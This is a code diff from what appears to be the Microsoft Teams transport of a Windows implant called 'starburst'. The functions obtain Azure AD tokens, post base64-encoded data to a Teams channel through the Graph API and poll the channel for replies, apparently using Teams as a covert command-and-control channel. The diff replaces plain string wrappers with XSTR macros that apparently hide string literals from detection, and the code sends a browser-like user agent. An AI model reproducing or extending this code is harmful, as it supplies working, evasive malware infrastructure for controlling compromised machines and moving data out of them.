@@ -171,33 +171,32 @@ static auto declfn msteams_authenticate(
     instance& inst
 ) -> bool {
     char path[256] = { 0 };
-    str_copy( path, symbol<char*>( const_cast<char*>( "/" ) ) );
+    str_copy( path, XSTR( "/" ) );
     str_concat( path, inst.transport.msteams_tenant_id );
-    str_concat( path, symbol<char*>( const_cast<char*>( "/oauth2/v2.0/token" ) ) );
+    str_concat( path, XSTR( "/oauth2/v2.0/token" ) );
 
     char body[1024] = { 0 };
-    str_copy( body, symbol<char*>( const_cast<char*>( "grant_type=client_credentials&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&client_id=" ) ) );
+    str_copy( body, XSTR( "grant_type=client_credentials&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&client_id=" ) );
     str_concat( body, inst.transport.msteams_client_id );
-    str_concat( body, symbol<char*>( const_cast<char*>( "&client_secret=" ) ) );
+    str_concat( body, XSTR( "&client_secret=" ) );
     str_concat( body, inst.transport.msteams_client_secret );
 
-    auto headers = symbol<char*>( const_cast<char*>(
-        "Content-Type: application/x-www-form-urlencoded\r\n" ) );
+    auto headers = XSTR("Content-Type: application/x-www-form-urlencoded\r\n");
 
     uint8_t* resp_buf  = nullptr;
     uint32_t resp_len  = 0;
 
     bool ok = winhttp_request(
         inst,
-        symbol<const char*>( LOGIN_HOST ),
-        symbol<const char*>( "POST" ),
+        XSTR( LOGIN_HOST ),
+        XSTR( "POST" ),
         path, headers, body, str_len( body ),
         &resp_buf, &resp_len
     );
 
     if ( !ok || !resp_buf ) return false;
 
-    auto needle = symbol<char*>( const_cast<char*>( "access_token" ) );
+    auto needle = XSTR( "access_token" );
     uint32_t token_len = json_extract_string(
         reinterpret_cast<char*>( resp_buf ), resp_len,
         needle, str_len( needle ),
@@ -231,27 +230,27 @@ static auto declfn msteams_build_auth_header(
     instance& inst,
     char*     out
 ) -> void {
-    str_copy( out, symbol<char*>( const_cast<char*>( "Authorization: Bearer " ) ) );
+    str_copy( out, XSTR( "Authorization: Bearer " ) );
     str_concat( out, inst.transport.msteams_access_token );
-    str_concat( out, symbol<char*>( const_cast<char*>( "\r\nContent-Type: application/json\r\n" ) ) );
+    str_concat( out, XSTR( "\r\nContent-Type: application/json\r\n" ) );
 }
 
 static auto declfn msteams_build_messages_path(
     instance& inst,
     char*     out
 ) -> void {
-    str_copy( out, symbol<char*>( const_cast<char*>( "/v1.0/teams/" ) ) );
+    str_copy( out, XSTR( "/v1.0/teams/" ) );
     str_concat( out, inst.transport.msteams_team_id );
-    str_concat( out, symbol<char*>( const_cast<char*>( "/channels/" ) ) );
+    str_concat( out, XSTR( "/channels/" ) );
     str_concat( out, inst.transport.msteams_channel_id );
-    str_concat( out, symbol<char*>( const_cast<char*>( "/messages" ) ) );
+    str_concat( out, XSTR( "/messages" ) );
 }
 
 auto declfn starburst::msteams_init(
     _Inout_ instance& inst
 ) -> bool {
     inst.h_session = inst.winhttp.WinHttpOpen(
-        symbol<LPCWSTR>( L"Mozilla/5.0" ),
+        XWSTR( L"Mozilla/5.0" ),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
@@ -312,12 +311,11 @@ auto declfn starburst::msteams_send(
     auto json_body = static_cast<char*>( inst.heap_alloc( json_cap ) );
     if ( !json_body ) { inst.heap_free( sent_b64 ); return false; }
 
-    str_copy( json_body, symbol<char*>( const_cast<char*>(
-        "{\"body\":{\"contentType\":\"text\",\"content\":\"" ) ) );
+    str_copy( json_body, XSTR("{\"body\":{\"contentType\":\"text\",\"content\":\"") );
     uint32_t pos = str_len( json_body );
     memory::copy( json_body + pos, sent_b64, sent_b64_len );
     pos += sent_b64_len;
-    str_copy( json_body + pos, symbol<char*>( const_cast<char*>( "\"}}" ) ) );
+    str_copy( json_body + pos, XSTR( "\"}}" ) );
     pos += 3;
 
     char msg_path[512] = { 0 };
@@ -330,8 +328,8 @@ auto declfn starburst::msteams_send(
     uint32_t post_rlen  = 0;
     bool ok = winhttp_request(
         inst,
-        symbol<const char*>( GRAPH_API_HOST ),
-        symbol<const char*>( "POST" ),
+        XSTR( GRAPH_API_HOST ),
+        XSTR( "POST" ),
         msg_path, auth_header, json_body, pos,
         &post_resp, &post_rlen
     );
@@ -357,7 +355,7 @@ auto declfn starburst::msteams_send(
 
         char get_path[512] = { 0 };
         msteams_build_messages_path( inst, get_path );
-        str_concat( get_path, symbol<char*>( const_cast<char*>( "?$top=5" ) ) );
+        str_concat( get_path, XSTR( "?$top=5" ) );
 
         char get_auth[2560] = { 0 };
         msteams_build_auth_header( inst, get_auth );
@@ -365,8 +363,8 @@ auto declfn starburst::msteams_send(
         uint8_t* get_buf  = nullptr;
         uint32_t get_size = 0;
         if ( !winhttp_request( inst,
-                symbol<const char*>( GRAPH_API_HOST ),
-                symbol<const char*>( "GET" ),
+                XSTR( GRAPH_API_HOST ),
+                XSTR( "GET" ),
                 get_path, get_auth, nullptr, 0,
                 &get_buf, &get_size ) ) {
             continue;
@@ -375,7 +373,7 @@ auto declfn starburst::msteams_send(
         if ( !get_buf || get_size == 0 ) continue;
 
         auto json_data = reinterpret_cast<char*>( get_buf );
-        auto content_needle = symbol<char*>( const_cast<char*>( "content" ) );
+        auto content_needle = XSTR( "content" );
         uint32_t cnl = str_len( content_needle );
 
         found_body[0] = '\0';
